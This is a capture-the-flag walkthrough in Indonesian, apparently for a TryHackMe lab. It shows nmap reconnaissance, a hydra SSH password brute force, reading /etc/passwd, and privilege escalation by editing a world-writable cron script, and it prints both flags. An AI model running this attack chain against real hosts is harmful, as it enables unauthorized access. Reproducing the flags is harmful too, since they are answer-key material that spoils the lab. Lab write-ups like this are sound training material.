scan dengan nmap
```
nmap -sC -sV -Pn IP-target
...
4567/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 36:a5:78:51:d8:ad:67:d4:09:a6:e0:77:55:c1:4a:c0 (RSA)
|   256 88:fe:e2:90:cd:a0:04:ae:26:61:0a:5f:24:2b:e6:5e (ECDSA)
|_  256 3d:d3:b5:19:6d:59:7e:ec:79:47:72:80:3b:79:1f:f3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

selanjutnya bruteforce ssh Sam dengan hydra
```
hydra -l Sam -P /usr/share/wordlists/rockyou.txt IP-target -s 4567 ssh
...
...
[DATA] attacking ssh://10.10.27.40:4567/
[4567][ssh] host: 10.10.27.40   login: Sam   password: chocolate
1 of 1 target successfully completed, 1 valid password found
...
```

selanjutnya login menggunakan creds yang didapat, dan `cat flag1.txt` pada home dir Sam.
```
ssh Sam@IP-target
password: 
...
...
cat flag1.txt
THM{dec4389bc09669650f3479334532aeab}
```

selanjutnya kita cari siapa saja user yang ada didalam target dengan cara
```
cat /etc/passwd
...
...
Ubuntu:x:1000:1000:Ubuntu:/home/Ubuntu:/bin/bash           
Sam:x:1001:1001:Elf Sam,,,:/home/Sam:/bin/bash
```

dapat dilihat bahwa terdapat user bernama Ubuntu. untuk dapat privesc ke user Ubuntu, kita dapat memulainya dengan cara mencari file yang dimiliki oleh user Ubuntu dengan cara
```
find / type f -group ubuntu 2>/dev/null
...
/home/scripts/clean_up.sh
/home/ubuntu
/home/ubuntu/.ssh
/home/ubuntu/.profile
/home/ubuntu/.bash_history
/home/ubuntu/.cache
/home/ubuntu/.nano
/home/ubuntu/.sudo_as_admin_successful
/home/ubuntu/.vim
/home/ubuntu/.vim/.netrwhist
/home/ubuntu/flag2.txt
/home/ubuntu/.bashrc
/home/ubuntu/.bash_logout
```

dapat dilihat bahwa flag2.txt dimiliki oleh user Ubuntu, namun kita tidak bisa melihat kontennya. tapi terdapat file menarik yaitu `/home/scripts/clean_up.sh`, yang mana jika dicek, file permissionnya adalah `-rwxrwxrwx`, yang berarti kita sebagai user sam dapat memodifikasi file tersebut. Selanjutnya kita dapat mulai memodifikasinya
```
vim clean_up.sh
...
#sebelum
#rm -rf /tmp/*

#ubah menjadi seperti berikut
cat /home/ubuntu/flag2.txt > /home/sam/result.txt
```
selanjutnya kita hanya perlu menuggu beberapa saat, dan  dapat melihat hasilnya

```
cat result.txt
...
THM{b27d33705f97ba2e1f444ec2da5f5f61}
```
